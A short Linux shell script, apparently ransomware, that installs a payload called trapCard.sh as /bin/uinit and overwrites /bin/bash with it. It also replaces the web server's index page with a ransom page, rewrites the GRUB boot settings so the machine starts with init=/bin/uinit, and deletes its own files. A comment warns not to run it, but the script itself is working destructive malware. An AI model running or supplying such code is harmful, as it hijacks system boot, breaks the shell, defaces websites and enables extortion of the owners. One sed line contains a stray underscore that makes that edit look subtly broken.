#! /bin/sh





#THIS SCRIPT IS VERY DANGEROUS. DO NOT RUN






cp trapCard.sh /bin/uinit
chmod +x /bin/uinit
cp ransom.html /var/www/html/index.html
cp /bin/bash /bin/bush
cp /bin/uinit /bin/bash

#comment out GRUB_CMDLINE_LINUX_DEFAULT
#GRUB_CMDLINE_LINUX needs to be GRUB_CMDLINE_LINUX="init=/bin/uinit"
sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub
sed -i '/.*GRUB_CMDLINE_LINUX=.*/c\GRUB_CMDLINE_LINUX_="init=/bin/uinit"' /etc/default/grub
sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub.d/50-curtin-settings.cfg

rm trapCard.sh
rm ransom.html
rm ransomLinux.sh
